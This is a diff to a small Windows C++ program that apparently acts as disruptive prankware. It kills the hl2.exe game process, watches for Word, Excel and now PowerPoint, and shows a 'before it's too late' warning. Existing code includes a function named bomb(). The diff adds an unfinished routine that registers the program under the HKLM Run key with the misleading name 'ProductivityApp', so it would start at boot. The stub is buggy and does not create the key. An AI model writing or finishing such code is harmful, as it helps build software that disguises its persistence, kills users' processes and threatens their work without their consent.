@@ -3,7 +3,6 @@
 #include <TlHelp32.h>
 #include <string>
 #include <WinUser.h>
-#include <vector>
 #include <unordered_set>
 
 void bomb()
@@ -116,6 +115,7 @@ void scan_important_procs()
 	std::unordered_set<std::wstring> processes;
 	processes.insert(L"WINWORD.EXE");
 	processes.insert(L"EXCEL.EXE");
+	processes.insert(L"POWERPNT.EXE");
 
 	if (!scan_proc(processes))
 		::MessageBoxExW(NULL, L"Save and close your work before it's too late", L"WARNING", MB_OK|MB_ICONWARNING, 0);
@@ -125,9 +125,54 @@ void scan_important_procs()
 		;
 }
 
+// TODO
+bool add_to_registry()
+{
+	HKEY hRoot = HKEY_LOCAL_MACHINE;
+	std::wstring subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+	std::wstring app_name = L"ProductivityApp";
+
+	// CHANGEME
+	std::wstring exe_path = L"PATH_TO_EXE";
+
+	DWORD exe_path_size = sizeof(exe_path);
+	HKEY hResult;
+	LONG lResult;
+	
+	// check to see if exe already in registry
+	lResult = ::RegOpenKeyExW(hRoot, subKey.c_str(), 0, KEY_READ | KEY_WRITE, &hResult);
+	DWORD dwRegType = REG_SZ;
+
+
+	if (lResult == ERROR_SUCCESS)
+	{
+		lResult = ::RegGetValueW(hRoot, subKey.c_str(), app_name.c_str(), RRF_RT_REG_SZ, &dwRegType, (PVOID)exe_path.c_str(), &exe_path_size);
+		if (lResult == ERROR_SUCCESS)
+			return true;
+		else
+		{
+			if (lResult == ERROR_MORE_DATA)
+			{
+				std::wcerr << L"pvData too small to receive data" << std::endl;
+				return false;
+			}
+				
+			if (lResult == ERROR_FILE_NOT_FOUND)
+			{
+				// create key and value
+			}
+		}
+	}
+	
+	return true;
+}
+
 int main()
 {
 	std::wstring proc_to_end = L"hl2.exe";
+
+	if (!add_to_registry())
+		return EXIT_FAILURE;
 	
 	if (end_proc(proc_to_end) != EXIT_SUCCESS)
 		return EXIT_FAILURE;
